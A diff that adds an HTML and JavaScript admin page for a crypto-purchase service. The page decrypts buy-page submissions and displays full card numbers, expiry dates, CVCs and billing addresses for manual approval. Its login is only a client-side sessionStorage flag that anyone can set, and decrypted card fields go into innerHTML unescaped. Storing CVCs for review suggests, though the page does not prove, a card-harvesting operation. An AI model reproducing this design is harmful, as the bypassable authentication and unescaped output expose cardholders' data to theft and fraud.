@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Purchase Approvals - PayStream</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
+            margin: 0;
+            padding: 40px 20px;
+        }
+        .wrap {
+            max-width: 760px;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .panel {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #666;
+            font-size: 14px;
+        }
+        textarea {
+            width: 100%;
+            box-sizing: border-box;
+            font-family: 'SFMono-Regular', Consolas, monospace;
+            font-size: 12px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            resize: vertical;
+        }
+        .key-hint {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 6px;
+        }
+        .toolbar {
+            display: flex;
+            gap: 10px;
+            margin-top: 14px;
+        }
+        button {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn-primary { background: #007bff; color: white; }
+        .btn-primary:hover { background: #0056b3; }
+        .btn-secondary { background: #eee; color: #333; }
+        .btn-secondary:hover { background: #ddd; }
+        .btn-approve { background: #28a745; color: white; }
+        .btn-approve:hover { background: #1e7e34; }
+        .btn-reject { background: #dc3545; color: white; }
+        .btn-reject:hover { background: #b02a37; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .request-card {
+            border: 1px solid #eee;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 14px;
+        }
+        .request-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 10px;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        .status-pending { background: #fff3cd; color: #856404; }
+        .status-approved { background: #d4edda; color: #155724; }
+        .status-rejected { background: #f8d7da; color: #721c24; }
+
+        dl {
+            display: grid;
+            grid-template-columns: 140px 1fr;
+            row-gap: 4px;
+            column-gap: 10px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        dt { color: #888; }
+        dd { margin: 0; color: #222; word-break: break-word; }
+
+        .error-text { color: #dc3545; font-size: 13px; margin-top: 8px; }
+        .empty-state { color: #999; text-align: center; padding: 30px 0; }
+
+        .login-wrap {
+            max-width: 360px;
+            margin: 80px auto 0;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        [hidden] { display: none !important; }
+    </style>
+</head>
+<body>
+    <div id="loginScreen" class="wrap login-wrap">
+        <h1>Admin Login</h1>
+        <div class="panel">
+            <form id="loginForm">
+                <label for="username">Username</label>
+                <input type="text" id="username" autocomplete="username" required>
+                <label for="password">Password</label>
+                <input type="password" id="password" autocomplete="current-password" required>
+                <button type="submit" class="btn-primary" style="width:100%">Log In</button>
+                <div id="loginError" class="error-text"></div>
+            </form>
+        </div>
+    </div>
+
+    <div id="adminScreen" class="wrap" hidden>
+        <h1>Purchase Approvals</h1>
+        <div class="subtitle">Decrypt and review crypto purchase requests submitted via the buy page.</div>
+        <div class="toolbar" style="margin-bottom: 20px;">
+            <button class="btn-secondary" id="logoutBtn">Log Out</button>
+        </div>
+
+        <div class="panel">
+            <label for="privateKey">RSA Private Key (PKCS#8 PEM)</label>
+            <textarea id="privateKey" rows="8" placeholder="-----BEGIN PRIVATE KEY-----&#10;...&#10;-----END PRIVATE KEY-----"></textarea>
+            <div class="key-hint">
+                Pasted here only - never sent anywhere, kept in memory in this tab only.
+                Needs the PKCS#8 form (use <code>keys/purchase_private_key_pkcs8.pem</code> locally,
+                not the raw <code>openssl genrsa</code> output).
+            </div>
+            <div class="toolbar">
+                <button class="btn-primary" id="loadBtn">Load Pending Requests</button>
+                <button class="btn-secondary" id="clearKeyBtn">Clear Key</button>
+            </div>
+            <div id="loadError" class="error-text"></div>
+        </div>
+
+        <div id="requestsContainer"></div>
+    </div>
+
+    <script type="module">
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
+
+        const supabase = createClient(
+            'https://memgpowzdqeuwdpueajh.supabase.co',
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1lbWdwb3d6ZHFldXdkcHVlYWpoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxODA2MTMsImV4cCI6MjA3NTc1NjYxM30.k_AkdRumCYcF2CS0437VjRWAkorz9N7EZGWuMzCuAFk'
+        );
+
+        const SESSION_KEY = 'paystream_admin_authed';
+
+        function showAdminScreen() {
+            document.getElementById('loginScreen').hidden = true;
+            document.getElementById('adminScreen').hidden = false;
+        }
+
+        function showLoginScreen() {
+            document.getElementById('adminScreen').hidden = true;
+            document.getElementById('loginScreen').hidden = false;
+        }
+
+        if (sessionStorage.getItem(SESSION_KEY) === 'true') {
+            showAdminScreen();
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const loginError = document.getElementById('loginError');
+            loginError.textContent = '';
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const { data, error } = await supabase.rpc('verify_admin_login', {
+                p_username: username,
+                p_password: password,
+            });
+
+            if (error) {
+                loginError.textContent = 'Login failed: ' + error.message;
+                return;
+            }
+
+            if (data === true) {
+                sessionStorage.setItem(SESSION_KEY, 'true');
+                document.getElementById('password').value = '';
+                showAdminScreen();
+            } else {
+                loginError.textContent = 'Invalid username or password.';
+            }
+        });
+
+        document.getElementById('logoutBtn').addEventListener('click', () => {
+            sessionStorage.removeItem(SESSION_KEY);
+            document.getElementById('privateKey').value = '';
+            document.getElementById('requestsContainer').innerHTML = '';
+            showLoginScreen();
+        });
+
+        function pemToArrayBuffer(pem, marker) {
+            const b64 = pem
+                .replace(`-----BEGIN ${marker}-----`, '')
+                .replace(`-----END ${marker}-----`, '')
+                .replace(/\s+/g, '');
+            const raw = atob(b64);
+            const buf = new Uint8Array(raw.length);
+            for (let i = 0; i < raw.length; i++) buf[i] = raw.charCodeAt(i);
+            return buf.buffer;
+        }
+
+        function base64ToBuf(b64) {
+            const raw = atob(b64);
+            const buf = new Uint8Array(raw.length);
+            for (let i = 0; i < raw.length; i++) buf[i] = raw.charCodeAt(i);
+            return buf.buffer;
+        }
+
+        async function importPrivateKey(pem) {
+            if (!pem.includes('BEGIN PRIVATE KEY')) {
+                throw new Error('Key must be PKCS#8 (starts with "-----BEGIN PRIVATE KEY-----"). Convert with: openssl pkcs8 -topk8 -nocrypt -in your_key.pem -out pkcs8_key.pem');
+            }
+            return crypto.subtle.importKey(
+                'pkcs8',
+                pemToArrayBuffer(pem, 'PRIVATE KEY'),
+                { name: 'RSA-OAEP', hash: 'SHA-256' },
+                false,
+                ['decrypt']
+            );
+        }
+
+        async function decryptRequest(row, privateKey) {
+            const rawAesKey = await crypto.subtle.decrypt(
+                { name: 'RSA-OAEP' },
+                privateKey,
+                base64ToBuf(row.encrypted_key)
+            );
+            const aesKey = await crypto.subtle.importKey(
+                'raw',
+                rawAesKey,
+                { name: 'AES-GCM' },
+                false,
+                ['decrypt']
+            );
+            const plaintext = await crypto.subtle.decrypt(
+                { name: 'AES-GCM', iv: base64ToBuf(row.iv) },
+                aesKey,
+                base64ToBuf(row.ciphertext)
+            );
+            return JSON.parse(new TextDecoder().decode(plaintext));
+        }
+
+        function renderRequest(row, data, error) {
+            const el = document.createElement('div');
+            el.className = 'request-card';
+
+            const statusClass = `status-${row.status}`;
+            let body;
+            if (error) {
+                body = `<div class="error-text">Failed to decrypt: ${error.message}</div>`;
+            } else {
+                body = `
+                    <dl>
+                        <dt>Amount</dt><dd>${data.amount} ${data.asset}</dd>
+                        <dt>Name on Card</dt><dd>${data.cardName}</dd>
+                        <dt>Card Number</dt><dd>${data.cardNumber}</dd>
+                        <dt>Expiry</dt><dd>${data.cardExpiry}</dd>
+                        <dt>CVC</dt><dd>${data.cardCvc}</dd>
+                        <dt>Billing Address</dt><dd>${[data.billingAddress1, data.billingAddress2].filter(Boolean).join(', ')}</dd>
+                        <dt>City / State</dt><dd>${data.billingCity}, ${data.billingState}</dd>
+                        <dt>ZIP / Country</dt><dd>${data.billingZip}, ${data.billingCountry}</dd>
+                    </dl>
+                `;
+            }
+
+            const showActions = row.status === 'pending' && !error;
+
+            el.innerHTML = `
+                <div class="request-meta">
+                    <span>${new Date(row.created_at).toLocaleString()} &middot; ${row.id}</span>
+                    <span class="status-badge ${statusClass}">${row.status}</span>
+                </div>
+                ${body}
+                ${showActions ? `
+                    <div class="toolbar">
+                        <button class="btn-approve" data-action="approved">Approve</button>
+                        <button class="btn-reject" data-action="rejected">Reject</button>
+                    </div>
+                ` : ''}
+            `;
+
+            if (showActions) {
+                el.querySelectorAll('[data-action]').forEach((btn) => {
+                    btn.addEventListener('click', async () => {
+                        btn.disabled = true;
+                        const { error: updateError } = await supabase
+                            .from('purchase_requests')
+                            .update({ status: btn.dataset.action, decided_at: new Date().toISOString() })
+                            .eq('id', row.id);
+                        if (updateError) {
+                            alert('Failed to update status: ' + updateError.message);
+                            btn.disabled = false;
+                            return;
+                        }
+                        row.status = btn.dataset.action;
+                        el.replaceWith(renderRequest(row, data, null));
+                    });
+                });
+            }
+
+            return el;
+        }
+
+        document.getElementById('clearKeyBtn').addEventListener('click', () => {
+            document.getElementById('privateKey').value = '';
+        });
+
+        document.getElementById('loadBtn').addEventListener('click', async () => {
+            const loadError = document.getElementById('loadError');
+            const container = document.getElementById('requestsContainer');
+            loadError.textContent = '';
+            container.innerHTML = '';
+
+            const pem = document.getElementById('privateKey').value.trim();
+            if (!pem) {
+                loadError.textContent = 'Paste your private key first.';
+                return;
+            }
+
+            let privateKey;
+            try {
+                privateKey = await importPrivateKey(pem);
+            } catch (err) {
+                loadError.textContent = err.message;
+                return;
+            }
+
+            const { data: rows, error } = await supabase
+                .from('purchase_requests')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            if (error) {
+                loadError.textContent = 'Failed to load requests: ' + error.message;
+                return;
+            }
+
+            if (!rows.length) {
+                container.innerHTML = '<div class="empty-state">No purchase requests yet.</div>';
+                return;
+            }
+
+            for (const row of rows) {
+                try {
+                    const data = await decryptRequest(row, privateKey);
+                    container.appendChild(renderRequest(row, data, null));
+                } catch (err) {
+                    container.appendChild(renderRequest(row, null, err));
+                }
+            }
+        });
+    </script>
+</body>
+</html>
